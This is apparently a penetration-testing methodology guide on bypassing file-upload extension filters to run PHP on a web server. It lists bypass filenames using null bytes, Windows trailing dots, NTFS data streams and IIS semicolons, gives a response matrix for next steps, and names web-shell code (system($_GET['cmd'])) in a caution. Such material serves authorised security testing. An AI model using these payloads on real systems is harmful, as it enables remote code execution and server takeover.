```text
┌────────────────────────────────────────────────────────────────────────┐
│               OBFUSCATED EXTENSION FILE UPLOAD FLOW                    │
└────────────────────────────────────────────────────────────────────────┘
                                   │
                                   ▼
          ┌──────────────────────────────────────────────────┐
          │ Phase 1: Baseline Recon & Extension Filter Check │
          └──────────────────────────────────────────────────┘
                                   │
                                   ▼
          ┌──────────────────────────────────────────────────┐
          │ Phase 2: Obfuscation & Truncation Injection      │
          └──────────────────────────────────────────────────┘
                                   │
                                   ▼
          ┌──────────────────────────────────────────────────┐
          │ Phase 3: Storage Truncation & Execution Check    │
          └──────────────────────────────────────────────────┘
                                   │
                                   ▼
          ┌──────────────────────────────────────────────────┐
          │ Phase 4: Execution Verification & Safe PoC       │
          └──────────────────────────────────────────────────┘

```

---

### Step-by-Step Methodology Flow

#### Phase 1: Baseline Recon & Extension Filter Check

* **Baseline Valid Upload:** Upload a legitimate image file (`avatar.jpg`) and intercept the request in Burp Suite to confirm normal server processing.
* **Direct Script Rejection Check:** Attempt to upload a raw script file (`poc.php`).
* If the response returns an error like `"Only .jpg or .png allowed"`, the application enforces a file extension restriction (whitelist or regex validation).


* **Validation Mechanism Analysis:** Determine whether the application inspects the file extension at the application layer (e.g., regex checking string endings) or at the OS/filesystem handler level.

---

#### Phase 2: Obfuscation & Truncation Injection

Attempt to bypass high-level string checks while tricking lower-level file storage functions into truncating or misinterpreting the filename.

* **Null Byte Injection (Legacy/C-Library Truncation):**
* *Mechanism:* High-level validation sees `.jpg` at the end and passes the check. Lower-level C functions handling disk write operations treat `0x00` as a string terminator, stopping execution and saving the file as `poc.php`.
* *Analogy:* Imagine a security guard checking passports who looks only at the last line (`.jpg`) and grants entry, but the clerk entering the name into the computer hits a stop code (`%00`) and prints the badge using only the first part of the name (`poc.php`).
* *Payload Variants:*
* URL-Encoded Null Byte: `filename="poc.php%00.jpg"`
* Hex Null Byte (via Burp Hex Editor): `filename="poc.php\x00.jpg"`




* **OS-Specific Trailing Character Truncation (Windows / NTFS):**
* Windows filesystems automatically strip trailing dots and spaces during file creation:
* Trailing Dot: `filename="poc.php."` -> Saved on Windows disk as `poc.php`
* Trailing Space: `filename="poc.php "` -> Saved on Windows disk as `poc.php`
* Alternate Data Stream (NTFS): `filename="poc.php::$DATA"` -> Writes raw file contents to `poc.php` without the `$DATA` stream suffix.




* **Web Server Parsing Quirks (IIS & Apache):**
* IIS Semi-Colon Execution: `filename="poc.php;.jpg"` -> Bypasses extension check, IIS executes as PHP.
* Apache Multi-Extension Execution: `filename="poc.php.jpg"` -> If Apache `mod_php` is configured to execute `.php` anywhere in the filename and `.jpg` is unmapped, it executes as PHP.


* **High/Low Case & Unicode Obfuscation:**
* Mixed Case: `filename="poc.PhP"`, `filename="poc.pHp5"`
* Unicode/URL Obfuscation: `filename="poc.p%68p"` or multi-byte UTF-8 sequences.



---

#### Phase 3: Storage Truncation & Execution Check

* **Inspect the Server Response:** Check the upload confirmation message returned by the server:
* Output: `"File avatars/poc.php uploaded"` -> High-level filter checked `.jpg`, but filesystem/string parser truncated at `%00` or stripped trailing bytes. **Truncation Confirmed.**
* Output: `"File avatars/poc.php%00.jpg uploaded"` -> Server sanitized or literalized the string without truncating.


* **Locate the File URL:** Compare the saved filename on disk against the base upload path (e.g., `[https://example.com/files/avatars/poc.php](https://example.com/files/avatars/poc.php)`).

---

#### Phase 4: Execution Verification & Safe PoC

* **Issue GET Request:** Send a direct HTTP `GET` request to the truncated file location (`/files/avatars/poc.php`) in Burp Repeater.
* **Verify Code Execution:**
* **HTTP 200 OK + Rendered Output:** Server executed the script. **Vulnerability Confirmed.**
* **HTTP 200 OK + Raw PHP Code:** File truncated and uploaded, but directory lacks script execution permissions.
* **HTTP 404 Not Found:** File was saved under a randomized name, deleted by antivirus/WAF, or stored in a non-public folder.



---

### Real-World Response Matrix

| Filename Payload | Confirmation Message | File Target URL | Next Action Step |
| --- | --- | --- | --- |
| `poc.php%00.jpg` | `Uploaded poc.php` | `/avatars/poc.php` | Issue GET request to verify PHP code execution. **Vulnerability Confirmed.** |
| `poc.php%00.jpg` | `Uploaded poc.php%00.jpg` | `/avatars/poc.php%00.jpg` | Null byte literalized. Test Windows trailing dot (`poc.php.`) or IIS semicolon (`poc.php;.jpg`). |
| `poc.php.` | `Uploaded poc.php` | `/avatars/poc.php` | Windows OS trailing dot stripped. Send GET request to test execution. |
| `poc.php;.jpg` | `Uploaded poc.php;.jpg` | `/avatars/poc.php;.jpg` | Issue GET request on IIS servers to test semi-colon handler execution. |

---

### Critical Real-World Factors

* **PHP Version Fixes vs. Modern Microservices:** PHP patched null byte vulnerabilities in C-based file system functions in **PHP 5.3.4**. However, this vulnerability still appears in modern environments due to:
* Custom C/C++ native modules or legacy file processing extensions.
* Microservice architectures where routing proxies (Nginx/Envoy) and backend storage services decode URLs at different processing layers.


* **OS-Level File Name Normalization:**
* **Windows (NTFS/FAT32):** Automatically removes trailing spaces and trailing periods from filenames during disk creation, converting `file.php.` directly to `file.php`.
* **Linux (ext4/xfs):** Preserves trailing periods and spaces as literal characters (`file.php.` remains `file.php.`), meaning Windows-specific truncation tricks fail on Linux targets.


* **Safe Proof-of-Concept (PoC) Standard:**
* **Never** upload active, interactive web shells (`c99`, `b374k`, or `system($_GET['cmd'])`).
* Use a non-destructive, single-line payload to prove execution safely:
```php
<?php echo "NULL_BYTE_SUCCESS_" . md5("PoC_Test"); ?>

```





---

### Related Next Steps to Explore

* **IIS Semi-Colon & Path Truncation Exploitation:** Remapping script execution on IIS web servers using semi-colon delimiter injection.
* **NTFS Alternate Data Streams (ADS) in File Uploads:** Bypassing extension filters on Windows systems via `::$DATA` stream overrides.
* **Polyglot Web Shell Injection:** Embedding web shell code inside valid image file binary headers (EXIF metadata) to pass deep content inspection.

---

> **Key Insight:** Obfuscated extension vulnerabilities exploit the mismatch between how high-level application code validates a filename string and how low-level operating systems or file-handling C libraries read string terminators.
